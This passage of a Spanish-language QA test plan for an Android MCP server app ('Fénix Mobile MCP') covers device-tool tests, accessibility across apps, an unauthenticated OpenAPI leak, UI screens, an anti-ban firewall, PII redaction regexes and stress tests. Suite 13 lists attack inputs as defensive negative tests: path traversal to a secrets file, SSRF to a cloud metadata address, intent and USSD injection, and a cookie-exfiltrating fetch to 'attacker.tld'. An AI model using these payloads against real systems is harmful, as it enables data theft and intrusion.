- **S4-53 / S4-53b `daniele_get_location`:** En `AndroidManifest.xml:6-43`, la variante `fossDebug` declara `ACCESS_FINE_LOCATION` y `ACCESS_COARSE_LOCATION` pero no `ACCESS_BACKGROUND_LOCATION`. **Probar 3 estados obligatorios:** (1) Con la app/FGS activo y GPS encendido → coordenadas reales del Moto G77 (`PASS_E2E`); (2) Con permiso solo aproximado (`COARSE`) → precisión degradada reportada; (3) Con ubicación desactivada o permiso revocado → `isError == true` estructurado (`PASS_BLOQUEO_CORRECTO`).

#### 4.13 `CameraTools.kt` (Restricción de Cámara en Background en Android 16 — Crítica #23)
- **S4-54 `daniele_list_cameras`**, **S4-55 `daniele_take_photo`**, **S4-56 `daniele_record_video`**:
  - **Nota Crítica #23:** En Android 16 (SDK 36), `cameraProvider.takePhoto()` en background sin Activity en primer plano o sin FGS de tipo `camera` activo lanza `SecurityException`. Probar ejecución con Fénix en foreground (`PASS_E2E` verificando archivo JPEG/MP4 no vacío) y desde background (si lanza `SecurityException`, implementar soporte de FGS camera / transparent activity o documentar restricción exacta).

#### 4.14 `SharingTools.kt` y 4.15 `FenixTools.kt`
- **S4-57 `daniele_share_file`**: Chooser con `FileProvider`.
- **S4-58 `memory_save`**, **S4-59 `memory_read`**, **S4-60 `zone_check`**, **S4-61 `turn_watch`**.

---

## SUITE 5: INTERACCIÓN MULTI-APP REAL (MATRIZ POR TIPO DE VISTA) E INSTALACIÓN HONESTA DE APK (CRÍTICAS #20, #22)
**Objetivo:** Evitar asumir que todas las apps exponen el mismo árbol de accesibilidad y probar cada arquitectura de vista real en el Moto G77.

| ID | Aplicación Objetivo | Particularidad Técnica (Crítica #22) | Procedimiento y Evidencia Exigida |
| :--- | :--- | :--- | :--- |
| **S5-01** | **Ajustes del Sistema (`com.android.settings`)** | Listas RecyclerView dinámicas con reciclado de nodos; `CacheInvalidationDebouncer` (`250 ms`) puede invalidar `node_id` durante el scroll. | Abrir Ajustes → capturar `get_screen_state` (`raw` vs `compact`, midiendo conteo de nodos y tokens) → hacer scroll hasta "Acerca del teléfono" / "Batería" → **re-resolver el `node_id` después del scroll** antes de `click_node` → capturar screenshot pre/post tap y extraer datos reales. |
| **S5-02** | **Termux (`com.termux`)** | La consola de Termux renderiza sobre un `TerminalView` custom (canvas de texto) que **no expone líneas individuales como nodos de accesibilidad estándar**. | Abrir `com.termux` con `daniele_open_app` → verificar que `daniele_get_current_app` reporta `com.termux` en foreground → inspeccionar los botones de barra extra/drawer que sí son nodos e interactuar sin prometer lectura falsa del buffer `TerminalView`. |
| **S5-03** | **Navegador Web Instalado** | Requiere `WebViewNodeMerger` + `clearFrameworkNodeCache()` (`McpAccessibilityService.kt:449-451`) para no leer un DOM obsoleto. | Abrir una URL estática local/pública vía `daniele_open_uri` → esperar carga con `daniele_wait_for_element(timeout=10000)` → forzar refresco de caché de nodos → extraer texto del DOM renderizado y navegar a un segundo enlace verificando que el árbol no devuelve el DOM anterior. |
| **S5-04** | **Calculadora / Reloj del Sistema** | Controles nativos con `resourceId` y `contentDescription`. | Ejecutar una operación matemática tocando botones por `click_node` (`7`, `×`, `8`, `=`) y leer el nodo de resultado (`56`) con screenshot de evidencia. |
| **S5-05b** | **Instalación Honesta de APK Nueva (Crítica #20)** | `AndroidManifest.xml` actualmente **no declara `REQUEST_INSTALL_PACKAGES`**, por lo que `PackageInstaller` directo desde la app lanzará `SecurityException` en Android 16. | **Protocolo Honesto:** (1) Pre-evidencia obligatoria: `adb shell pm list packages \| grep <paquete_nuevo>` debe devolver **vacío** antes de la prueba. (2) Verificar si se agrega `REQUEST_INSTALL_PACKAGES` + flujo `ACTION_VIEW` con `FileProvider` (con confirmación del usuario en el diálogo del instalador de Android) o instalación asistida por puente ADB. (3) Una vez instalada, verificar que aparece en `daniele_list_installed_apps`, consultar su versión exacta con `daniele_get_app_info`, abrirla con `daniele_open_app` e interactuar con su pantalla inicial. |

---

## SUITE 6: CONTRATO HTTP REAL DEL SERVIDOR MCP, OPENAPI 3.0.3 Y AUDITORÍA DE EXPOSICIÓN SIN AUTH (CRÍTICAS #21, #22 + PUNTO EJECUTIVO #3)
> **Hallazgo Crítico #21:**
> 1. `FenixOpenApiGenerator.kt:15-17` genera **`"openapi": "3.0.3"`** (no 3.1.0).
> 2. El generador documenta paths ficticios `/tools/{name}` (`65-77`), pero en `McpServer.kt:186-196` **NO existe ninguna ruta Ktor `POST /tools/{name}`** (solo existen `/health`, `/openapi.json`, `/s/{token}`, `/mcp` y rutas OAuth).
> 3. `/openapi.json` está incluido en `excludedPaths` (`McpServer.kt:170`), por lo que **se expone sin autenticación Bearer**, filtrando la lista completa de herramientas del teléfono en la red.

| ID | Prueba de Contrato HTTP / Seguridad | Procedimiento Técnico Exacto | Criterio de Éxito y Reparación |
| :--- | :--- | :--- | :--- |
| **S6-01b** | **Validación Real de `/openapi.json` (OpenAPI 3.0.3) y Cierre de Fuga sin Auth** | (1) Probar `GET http://127.0.0.1:8080/openapi.json` **sin Bearer Token**: actualmente devuelve `200 OK` (`LEAK` de capacidades). Quitar `/openapi.json` de `excludedPaths` en `McpServer.kt:170` (o exigir Bearer Token) y verificar que sin token devuelve **`401 Unauthorized`**. (2) Con Bearer Token válido, validar que el documento cumple el estándar **OpenAPI 3.0.3**. | `401` sin token (`PASS_NEGATIVO`) y `200 OK` OpenAPI 3.0.3 válido con Bearer Token (`PASS_E2E`). |
| **S6-02b** | **Alineación entre Rutas Documentadas (`/tools/{name}`) y Rutas Reales Ktor (`POST /mcp`)** | (1) Probar `POST http://127.0.0.1:8080/tools/memory_read`: actualmente devuelve `404 Not Found`. (2) **Reparación obligatoria:** O bien montar el endpoint REST real `POST /tools/{name}` (protegido por Bearer Token) en `McpServer.kt` que delegue a `FenixToolRegistry.executeInProcess`, o bien alinear `FenixOpenApiGenerator.kt` con el endpoint JSON-RPC real `POST /mcp`. (3) Probar ejecución real con Bearer Token (`200 OK`) y sin Bearer Token (`401 Unauthorized`). | 100% de correspondencia entre el esquema OpenAPI publicado y los endpoints Ktor reales ejecutables en el teléfono. |
| **S6-03** | **Interacción con Interfaz Web de IA desde el Teléfono** | Abrir un cliente web compatible en el teléfono (evitando sitios con bloqueo CAPTCHA automatizado o usando un cliente web local conectado al MCP del teléfono), enviar un prompt mediante nodos de accesibilidad (`WebViewNodeMerger`) y verificar la respuesta en pantalla. | Flujo completo sin lectura de DOM obsoleto (`clearFrameworkNodeCache()`). |

---

## SUITE 7 (S7-R): MAPA REAL DE PANTALLAS COMPOSE, SUB-PANTALLAS DE AJUSTES Y MUERTE DE PROCESO (CRÍTICAS #23, #24 + PUNTO EJECUTIVO #4)
> **Corrección Estructural (Crítica #23):** Se eliminan del Plan las pantallas inexistentes (`HomeScreen`, `FenixHubScreen`, `ConnectionScreen`, `ToolPermissionsScreen`, `LocationScreen`, `FileAccessScreen`, `CameraCaptureActivity`, `McpNavHost`). La Suite 7 se ejecuta sobre los **22 archivos de UI reales** presentes en `app/src/main/kotlin/com/fenix/mobilemcp/ui/`.

### 7.1 Pantallas Principales y Navegación (`MainScreen.kt` + `navigation/Routes.kt`)
- **S7-R01 `MainScreen.kt` + Bottom Navigation (`Routes.kt`):** Transiciones entre las 4 pestañas reales (`Chat`, `Server`, `Settings`, `About`) y rutas anidadas (`SettingsRoute`, `ServerRoute`).
- **S7-R02 `ChatScreen.kt` + `ToolCallCard`:** Selección de proveedor/modelo, botón de detección `/v1/models`, diálogo de API Key (`SecureKeyStore`), envío de prompts, expansión/colapso de `ToolCallCard` y limpieza de chat.
- **S7-R03 `ServerScreen.kt` + `ServerTabScreen.kt`:** Verificación de `ServerStatusCard` (switch start/stop de `McpServerService`), `ConnectionInfoCard` (IP, puerto, copia/rotación de Bearer Token) y `ServerLogsSection`.
- **S7-R04 `LogsScreen.kt`:** Visualización, filtrado, búsqueda y limpieza de logs de auditoría de llamadas MCP.
- **S7-R05 `AboutScreen.kt`:** Verificación de versión, licencias FOSS y enlaces informativos.
- **S7-R06 `ApprovalScreen.kt`:** Flujo interactivo de consentimiento OAuth / aprobación manual (botones `Approve` y `Deny`).
- **S7-R07 `ShareReceiverActivity.kt`:** Disparo de intents externos `ACTION_SEND` y `ACTION_SEND_MULTIPLE` hacia Fénix y verificación de recepción del archivo/texto compartido.

### 7.2 Las 13 Pantallas Reales de Ajustes (`ui/screens/settings/*` + `SettingsScreen.kt`)
- **S7-R08 `SettingsScreen.kt` + `SettingsIndexScreen.kt`:** Contenedor de navegación y lista índice de las secciones de configuración.
- **S7-R09 `GeneralSettingsScreen.kt`:** Opciones generales de arranque, comportamiento en segundo plano y tema visual.
- **S7-R10 `AccessSettingsScreen.kt`:** Configuración de red, host/bind address, puerto del servidor MCP y reglas de acceso.
- **S7-R11 `SecuritySettingsScreen.kt`:** Gestión de tokens de autenticación, rotación de credenciales y políticas de seguridad.
- **S7-R12 `PermissionsSettingsScreen.kt`:** Estado en vivo y botones de solicitud de permisos del sistema Android (Accesibilidad, Notificaciones, Ubicación, Cámara, Almacenamiento, Batería).
- **S7-R13 `McpToolsSettingsScreen.kt`:** Toggles de activación/desactivación por categoría y por herramienta individual (`isToolEnabled`).
- **S7-R14 `StorageSettingsScreen.kt`:** Gestión de ubicaciones de almacenamiento autorizadas (SAF / directorios locales) y límites de tamaño de archivo.
- **S7-R15 `TunnelSettingsScreen.kt`:** Configuración y control del túnel (`TunnelManager` / `cloudflared`).
- **S7-R16 `OAuthClientsScreen.kt`:** Listado y revocación de clientes OAuth registrados.
- **S7-R17 `PrivacySettingsScreen.kt`:** Configuración del pipeline de privacidad (`PrivacyPipeline`, `PrivacyToolGate`, `LocalNerSanitizer`).
- **S7-R18 `ChannelSettingsScreen.kt`:** Configuración de canales de comunicación y notificaciones.
- **S7-R19 `NotificationFilterScreen.kt`:** Filtros de paquetes permitidos/bloqueados para `McpNotificationListenerService`.
- **S7-R20 `WifiMonitorScreen.kt`:** Configuración de monitoreo de red Wi-Fi y políticas de reconexión.

### 7.3 Rotación en Mitad de Generación y Muerte de Proceso (Crítica #24)
- **S7-R21 Rotación Mid-Tool-Call:** Iniciar una generación con `isGenerating == true` y una `ToolCallCard` expandida; rotar pantalla (`Portrait ↔ Landscape`). **Assert:** No duplica la llamada HTTP al LLM, no deja el spinner colgado eternamente y `ToolCallCard` conserva su estado expandido (`rememberSaveable`).
- **S7-R22 Process Death Real (`am kill`):** Con la app en segundo plano, ejecutar `adb shell am kill com.fenix.mobilemcp.foss.debug` y reabrir la Activity. **Assert:** El estado se restaura limpiamente desde persistencia/`SavedStateHandle` o informa sesión reiniciada sin quedar bloqueado con `isGenerating = true` ni lanzar crash.

---

## SUITE 8: DESDOBLAMIENTO MODO TALLER QA VS MODO CALLE, BOTÓN DE VOLUMEN INSTRUMENTADO Y FIREWALL ANTI-BAN (CRÍTICAS #25, #26, #27 + PUNTO EJECUTIVO #5)

### S8-01b: Botón Físico de Volumen Instrumentado (`McpAccessibilityService.kt:351-371` — Crítica #25)
- **Problema detectado:** En Motorola, el conteo de `ACTION_DOWN` repetidos con `eventTime - downTime >= 550` puede no disparar si `notificationTimeout = 100ms` filtra eventos o si el usuario suelta la tecla, y devolver `return true` en `ACTION_UP` tras un hold puede dejar el estado de volumen del sistema "pegado".
- **Prueba Instrumentada:**
  1. Monitorear en vivo con `adb logcat -s MCP:AccessibilityService` registrando `action`, `downTime`, `eventTime` y `deltaMs`.
  2. Ejecutar **10 pulsaciones cortas (`<300 ms`)**: **Assert** que las 10 cambian el volumen en $\pm 1$ paso y `0` disparan `ACTION_VOICE_TRIGGER`.
  3. Ejecutar **10 pulsaciones largas (`>700 ms`)**: **Assert** que las 10 disparan `ACTION_VOICE_TRIGGER`, el slider de volumen no queda pegado al soltar (`ACTION_UP` limpio) y funciona tanto con pantalla encendida como con pantalla apagada/música activa.

### S8-02b: Desdoblamiento Formal `MODO_TALLER_QA` vs `MODO_CALLE` (`StreetImmunityChecker.kt` — Crítica #26)
- **Resolución de Auto-Contradicción:** `StreetImmunityChecker.kt:18-21` define `WORKSHOP_PORTS = [8022, 8080, 8081, 9222]`. Durante las Suites S1..S7 (`MODO_TALLER_QA`), los puertos `8080` (`McpServer`) y `8081` (`llama-server`) están deliberadamente abiertos, por lo que `isFullyImmune` **debe** dar `false`.
- **Reparación de `StreetImmunityChecker.kt` antes de la prueba:**
  1. Eliminar el valor hardcodeado `isFirewallActive = true` (línea 67) y conectarlo al estado real del `AccessibilityFirewall`.
  2. Corregir la lectura de `Settings.Global.ADB_ENABLED` / `DEVELOPMENT_SETTINGS_ENABLED` para Android 16 (SDK 36).
- **Prueba en 2 Fases:**
  - **Fase A (`MODO_TALLER_QA`):** Con `McpServer` (`:8080`) y `llama-server` (`:8081`) encendidos → **Assert** `auditStreetImmunity().openWorkshopPorts` contiene `[8080, 8081]` y `isFullyImmune == false` (`PASS_NEGATIVO` de detección de puertos abiertos).
  - **Fase B (Transición a `MODO_CALLE`):** Detener `McpServer` (`:8080`) y detener `llama-server` (`:8081`), verificar exención de batería con `adb shell dumpsys deviceidle whitelist | grep com.fenix.mobilemcp.foss.debug` y `adb shell appops get com.fenix.mobilemcp.foss.debug RUN_ANY_IN_BACKGROUND` (`allow`) → **Assert** `openWorkshopPorts.isEmpty()` y firewall activo (`PASS_E2E`).

### S8-03b: Firewall Anti-Ban Verificable en `ActionExecutor` y `DeliveryMonitor` (Crítica #27)
- **Problema detectado:** No basta con "prometer" no tocar PedidosYa; si `ActionExecutor` no tiene una denylist en código, cualquier tool (`daniele_tap`, `daniele_click_node`, `daniele_swipe`) podría inyectar gestos si una app de reparto está en primer plano, y `DeliveryMonitor.onContentChanged` (`130`) recibiría eventos `TYPE_WINDOW_CONTENT_CHANGED`.
- **Reparación y Prueba:**
  1. Implementar en `ActionExecutor` / `McpAccessibilityService` un guardia estricto (`AccessibilityFirewall`): si `currentPackage in DELIVERY_PROTECTED_PACKAGES` (ej. `com.pedidosya`, `com.rappi`, etc.), **bloquear en seco** cualquier llamada a `dispatchGesture`, `performAction(ACTION_CLICK)` o introspección de árbol, devolviendo `isError = true` con código `ANTI_BAN_BLOCKED`.
  2. Restringir la ingesta de apps de reparto exclusivamente a notificaciones pasivas (`McpNotificationListenerService`).
  3. **Test Negativo Automatizado (`S8-03b`):** Simular/colocar un paquete protegido en la denylist como activo e invocar `daniele_tap` y `daniele_get_screen_state` → **Assert** rechazo inmediato `isError == true` (`ANTI_BAN_BLOCKED`) en `<1 ms` sin llamar jamás a las APIs de `AccessibilityService`.

---

## SUITE 9: CABLEADO REAL DE `LocalNerSanitizer` AL PATH LLM Y CORPUS ARGENTINO DE PII/SECRETS (CRÍTICAS #28, #29 + PUNTO EJECUTIVO #6)
> **Hallazgo Crítico #28:** `LocalNerSanitizer.sanitize()` (`privacy/LocalNerSanitizer.kt:15-21`) **no estaba siendo invocado** en `FenixLlmClient.kt` ni en `ChatViewModel.kt` (`grep sanitize` = 0 resultados), por lo que cualquier secreto escrito en el chat viajaba en texto plano al proveedor cloud. Además, los marcadores del código (`[REDACTED_API_KEY]`, `[REDACTED_IMEI]`) no coincidían con los del Plan anterior, y faltaban expresiones regulares para `ghp_`, `eyJ` (JWT), DNI argentino, CBU de 22 dígitos, CUIT/CUIL y teléfonos `+54`.

| ID | Etapa | Crítica | Requerimiento de Código y Prueba de Verificación |
| :--- | :--- | :--- | :--- |
| **S9-00** | **Pre-Requisito: Cableado Obligatorio en `FenixLlmClient` / `ChatViewModel`** | **#28 (Bloqueante)** | (1) Integrar `LocalNerSanitizer.sanitize(text)` en `FenixLlmClient` antes de serializar el payload hacia cualquier endpoint cloud (excluyendo localhost `127.0.0.1`). (2) **Assert estático:** `grep -rn "LocalNerSanitizer" app/src/main/kotlin/com/fenix/mobilemcp/llm/ app/src/main/kotlin/com/fenix/mobilemcp/ui/viewmodels/` no vacío. (3) **Assert de red:** Interceptar el body HTTP saliente de `POST /chat/completions` y comprobar que el string original jamás sale por el socket. |
| **S9-01b** | **Redacción Exhaustiva de Tokens y Credenciales** | **#28, #29** | Ampliar `API_KEY_REGEX` / `JWT_REGEX` en `LocalNerSanitizer.kt` y probar individualmente: `sk-...`, `gsk_...`, `AIza...`, `ghp_...`, `eyJ...` (JWT de 3 partes), `Bearer ...`, `sambanova_...`, `cerebras_...`, `mistral_...`, `cohere_...`. **Assert:** Reemplazo exacto por el marcador canónico `[REDACTED_API_KEY]` / `[REDACTED_JWT]` y 0 fugas en red/logs. |
| **S9-02b** | **Corpus Argentino de PII y Hardware Serials** | **#29 (Alta)** | Incorporar y probar individualmente en `LocalNerSanitizer.kt`: (1) **DNI argentino** (7 y 8 dígitos con/sin puntos contextualizado), (2) **CBU/CVU bancario** (exactamente 22 dígitos), (3) **CUIT/CUIL** (`20-XXXXXXXX-X`, `27-...`, `30-...`), (4) **Teléfono argentino** (`+54 9 264 ...`), (5) **Email**, (6) **Tarjeta de crédito Luhn-válida** (`4242424242424242`), (7) **IMEI / Serial del Moto G77 (`ZY22MK7B2P`)**. Medir tasa de verdaderos positivos (100%) y falsos positivos en texto normal (0%). |

---

## SUITE 10: PRUEBAS DE RESISTENCIA (MONKEY CONFINADO), CONCURRENCIA SQLITE HONESTA Y PERFILADO CON UMBRALES RELATIVOS (CRÍTICAS #30, #31, #32 + PUNTO EJECUTIVO #7)

| ID | Prueba de Estrés / Rendimiento | Crítica | Protocolo Corregido y Criterio de Éxito Honesto |
| :--- | :--- | :--- | :--- |
| **S10-01b** | **Android Monkey Confinado en 2 Pasadas (Aislado de Cuota LLM)** | **#30 (Alta)** | Para evitar que Monkey toque `ChatScreen` enviando basura a las APIs cloud (quemando rate-limits) o desactive servicios en Ajustes: (1) Poner proveedores cloud en modo offline/mock local antes de iniciar. (2) Guardar snapshot de `settings get secure enabled_accessibility_services` y `enabled_notification_listeners`. (3) **Pasada 1 (In-App puro):** `adb shell monkey -p com.fenix.mobilemcp.foss.debug --pct-touch 50 --pct-motion 30 --pct-nav 10 --pct-majornav 10 --pct-appswitch 0 -v 2500`. (4) **Pasada 2 (Con AppSwitch):** `--pct-appswitch 5 -v 1000` seguido de restauración y verificación de `McpAccessibilityService.isReady()` y `McpServerService` vivo. **Assert:** `0 FATAL EXCEPTION` en `logcat -b crash`, `0 ANR`. |
| **S10-02b** | **Concurrencia Honesta en `FenixToolRegistry` y Transacciones SQLite WAL** | **#31 (Bloqueante)** | Separar la medición de dispatch en memoria de la latencia de disco SQLite, y envolver `FenixMemoryDb.kvGuardar` (`109-134`) en `beginTransactionNonExclusive()` / `setTransactionSuccessful()` + proteger `FenixToolRegistry.clear()` con lock/concurrencia segura: (1) **Dispatch puro en memoria:** 50 invocaciones concurrentes (`async(50)`) de `listar_conectores` → **Assert** `p50 < 5 ms`, `0 errores`. (2) **Concurrencia SQLite WAL real:** 50 invocaciones concurrentes de `memory_save` con 50 claves únicas → **Assert** `50 éxitos`, `0 SQLiteDatabaseLockedException`, y `kvLeer` confirma las 50 filas persistidas. |
| **S10-03b** | **Perfilado de RAM (`delta PSS`) y Térmico bajo Condiciones Controladas** | **#32 (Media)** | Fijar condiciones base en el Moto G77 (`brillo 50%`, Wi-Fi activo, sin carga rápida USB inyectando calor extra, registro de temperatura ambiente inicial). Medir `adb shell dumpsys meminfo --local com.fenix.mobilemcp.foss.debug`, `dumpsys battery` y `/sys/class/thermal/thermal_zone*/temp` antes y después de la suite de estrés (con y sin `llama-server` corriendo en Termux). **Assert:** `delta PSS < 50 MB` tras GC (ausencia de memory leaks acumulativos) y temperatura de batería `< 42.0 °C` (o incremento `< 4.0 °C` sobre la línea base). |

---

## SUITE 11: AUDITORÍA BINARIA DEL APK FOSS, COSTO $0.00 Y TABLA DE CONSTANTES VS DINÁMICOS (CRÍTICA #33)

- **S11-01b Auditoría Binaria de Dependencias Propietarias y Binarios Externos:**
  1. Inspeccionar `app-foss-debug.apk` con `apkanalyzer dex packages` / `strings`: **Assert** `0` clases de `com.google.android.gms` compiladas dentro de la variante `fossDebug`.
  2. Auditar `TunnelManager` y `CloudflaredBinaryResolver`: documentar comportamiento de red/descarga de `cloudflared` y asegurar que nunca se ejecute sin activación explícita del usuario en `TunnelSettingsScreen`.
- **S11-02b Auditoría de Cero Hardcodeo de Modelos y Datos de Usuario:**
  - Distinguir formalmente entre:
    - **Constantes de protocolo/infraestructura por diseño:** URLs base de APIs OpenAI-compat en `DynamicModelDiscovery.standardProviders`, puertos de auditoría en `WORKSHOP_PORTS`, y catálogo inicial semilla de zonas.
    - **Datos que JAMÁS deben estar hardcodeados (100% dinámicos):** IDs de modelos LLM (obtenidos vía `/v1/models`), claves API (`SecureKeyStore`), contenido académico/profesional del usuario (`FenixMemoryDb`), y conectores/skills creados por el usuario (`conectores_dinamicos`).

---

## SUITE 12: LOOP MULTI-TOOL SECUENCIAL, MATRIZ DE TRAZABILIDAD Y PROTOCOLO DE RE-TEST CON BACKUP (CRÍTICAS #34, #36)

- **S12-01 Loop Multi-Turn / Multi-Tool Secuencial (`ChatViewModel.kt:169-274` — Crítica #34):**
  - **Problema detectado:** `executeConversationTurn` solo hacía 1 ciclo `tool -> followUp` con `includeTools = false` en la segunda llamada (línea 228), impidiendo que el LLM encadenara 2 o 3 herramientas secuenciales (ej. `daniele_list_storage_locations` → `daniele_list_files` → `daniele_read_file`).
  - **Reparación y Prueba:** Actualizar `executeConversationTurn` para soportar un bucle acotado de hasta `MAX_TOOL_ITERATIONS = 5` turnos de herramientas con `includeTools = true` mientras el modelo devuelva `tool_calls`. Probar un prompt de 3 saltos (`listar ubicaciones → listar archivos → leer archivo`) y **assert** que se renderizan las 3 `ToolCallCard` con `isSuccess == true` (`isError == false`) y la respuesta final cita el contenido real leído.
- **S12-02 Trazabilidad de Re-Test y Preservación de Estado entre Compilaciones (Crítica #36):**
  - Antes de cada `adb install -r` o migración de `FenixMemoryDb`:
    1. Realizar backup verificable de `fenix_memory.db`, preferencias y snapshot de `dumpsys`.
    2. Verificar que `FenixMemoryDb.onUpgrade` migra esquemas sin pérdida de datos.
    3. Tras reinstalar, comprobar que `kvLeer`, `listar_conectores` y `listConfiguredProviders` conservan el 100% de los datos previos.
    4. Registrar cada ejecución en la Matriz asociándola al hash exacto del commit (`git rev-parse --short HEAD`) y `versionName`.

---

## SUITE 13 (NUEVA): PRUEBAS DESTRUCTIVAS, SEGURIDAD OFENSIVA, CAOS DE RED Y LÍMITES DE CUOTA (CRÍTICA #35 + PUNTO EJECUTIVO #8)
**Objetivo:** Intentar romper deliberadamente la seguridad, estabilidad y aislamiento de Fénix Mobile MCP mediante al menos **10 vectores de ataque y fallo extremo**.
**Criterio Global para toda la Suite 13:** `result.isError == true` (`PASS_NEGATIVO`), `0 crashes`, `0 ANR`, `0 fugas de datos o secretos en serverLog/logcat`, y recuperación inmediata de la UI.

| ID | Vector Destructivo / Negativo | Ataque o Fallo Inyectado en el Moto G77 | Defensa Esperada (`PASS_NEGATIVO`) |
| :--- | :--- | :--- | :--- |
| **S13-01** | **Path Traversal & Symlink Attack en `FileTools`** | Invocar `daniele_read_file`, `daniele_write_file` y `daniele_copy_file` con rutas `../../../../data/data/com.fenix.mobilemcp.foss.debug/shared_prefs/fenix_secure_vault.xml`, `/proc/self/environ`, symlinks maliciosos y URIs `content://` no autorizadas. | `StorageLocationProvider` + `PermissionChecker` rechazan el acceso con `isError = true` (Access Denied / Path Outside Allowed Locations). `0` bytes filtrados de `shared_prefs`. |
| **S13-02** | **SSRF (Server-Side Request Forgery) en Conectores y `open_uri`** | Invocar `supabase_select` o conectores HTTP apuntando a `http://127.0.0.1:8080/mcp`, `http://169.254.169.254/latest/meta-data/` o red interna `192.168.x.x`. | Bloqueado por allowlist de hosts permitidos antes de abrir el socket HTTP (`isError = true`). |
| **S13-03** | **Inyección de Intents Peligrosos y Códigos USSD en `IntentTools`** | Invocar `daniele_open_uri` / `daniele_send_intent` con esquemas `file:///data/...`, `intent://...#Intent;component=...`, códigos USSD `tel:*%2306%23` y componentes internos no exportados. | Rechazo de esquemas prohibidos (`file://`, `intent://` arbitrarios, USSD) devolviendo `isError = true`. |
| **S13-04** | **JS Exfiltrante en `QuickJsSkillEngine`** | Crear y ejecutar un conector cuyo `codigo_js` intente hacer `fetch('https://attacker.tld/?leak=' + document.cookie)`, acceder a `window.localStorage` o abrir `XMLHttpRequest`. | Bloqueo de red en el WebView sandbox (`setBlockNetworkLoads(true)` / `allowFileAccess = false` / `allowContentAccess = false`). El script falla sin realizar ninguna conexión saliente (`isError = true`). |
| **S13-05** | **Inputs Corruptos y Argumentos Nulos/Malformados** | Enviar a `FenixToolRegistry.executeInProcess` y a `POST /mcp`: (a) `arguments = null`, (b) JSON truncado `{"clave": "abc`, (c) tipos invertidos (`durationMs = "texto"`), (d) payloads de 5 MB en un argumento string. | Rechazo limpio de validación de esquema (`isError = true`), sin `NullPointerException` ni `OutOfMemoryError`. |
| **S13-06** | **Corte Abrupto de Red a Mitad de `tool_call` / LLM Stream (`2s`)** | Iniciar una consulta a Supabase o un turno de chat cloud y a los `2 segundos` ejecutar `adb shell svc wifi disable` (y datos móviles off). | El `HttpClient` aborta por timeout/IOException controlado, `_isGenerating` vuelve a `false` (o permite cancelación inmediata desde UI sin quedar colgado 45s) y muestra error claro al usuario. |
| **S13-07** | **Credencial Revocada (`HTTP 401/403`) Mid-Chat** | Inyectar una API Key inválida (`gsk_invalid_12345`) en el proveedor activo y enviar un mensaje en `ChatScreen`. | Reporte claro de `401 Unauthorized`, marcando el proveedor en estado de error sin entrar en bucle infinito ni crashear. |
| **S13-08** | **Tormenta de Rate-Limit (`HTTP 429`) Simultáneo en Múltiples Proveedores** | Simular/forzar respuesta `429 Too Many Requests` en 2 proveedores consecutivos durante el fallback de `ChatViewModel.kt:249`. | `ChatViewModel` respeta el `cooldown` por proveedor (sin hacer ping-pong infinito entre dos proveedores en `429`) y notifica limpiamente cuando todos los proveedores configurados están en enfriamiento. |
| **S13-09** | **Exceso de `fileSizeLimitMb` en Capability Links (`/s/{token}`)** | Intentar descargar/exponer a través de `McpServer.kt:204-212` (`GET /s/{token}`) un archivo que supere el límite `fileSizeLimitMb` configurado en `StorageSettingsScreen`. | El servidor rechaza la transferencia con código HTTP de error apropiado (`413 Payload Too Large` / `403`) sin cargar el archivo completo en RAM. |
| **S13-10** | **Capability Link Expirado o Falsificado (`/s/{token}`)** | Consumir `GET http://127.0.0.1:8080/s/token_inexistente_o_expirado_999`. | Respuesta inmediata `404 Not Found` sin filtrar rutas del sistema de archivos en el cuerpo de la respuesta ni en los headers. |
